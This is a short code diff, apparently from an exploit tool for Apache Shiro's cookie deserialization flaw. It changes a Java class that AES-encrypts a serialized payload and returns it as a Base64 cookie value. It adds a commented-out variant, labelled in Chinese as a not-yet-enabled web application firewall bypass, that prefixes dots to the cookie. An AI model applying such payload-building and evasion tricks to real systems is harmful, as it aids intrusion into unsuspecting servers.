@@ -44,8 +44,10 @@ public class Shiro implements FramePayload {
         } else {
             encryptpayload = AesUtil.encrypt(serpayload, bkey);
         }
+//增加绕waf的方法，暂不开启。by @by3 @liuwa
+        //return shiroKeyWord +  "=" +"...." + DatatypeConverter.printBase64Binary(encryptpayload);
+		return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);
 
-        return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);
     }
 
     public static void main(String[] args) throws Exception {
